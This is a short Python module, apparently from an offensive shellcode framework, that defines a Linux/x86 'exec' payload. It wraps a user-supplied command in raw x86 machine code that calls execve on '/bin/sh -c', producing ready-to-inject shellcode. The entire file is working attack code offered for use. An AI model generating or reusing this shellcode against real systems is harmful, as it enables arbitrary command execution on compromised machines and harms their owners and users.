from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Unkown"
    Shellcode.info["name"] = "Linux/x86 - exec shellcode"

    def __init__(self, **kwargs):
        db = [] 
        for x in kwargs["execommand"]:
            db.append("\\x" + x.encode("hex"))
        kwargs["execommand"] = "".join(db)

        Shellcode.info["size"] = 36 + Shellcode().getsize(kwargs["execommand"])
        Shellcode.info["payload"] = [
            r"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
            r"\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x12"
            r"\x00\x00\x00"
            + kwargs["execommand"] +
            r"\x00\x57\x53\x89\xe1\xcd\x80"
        ]


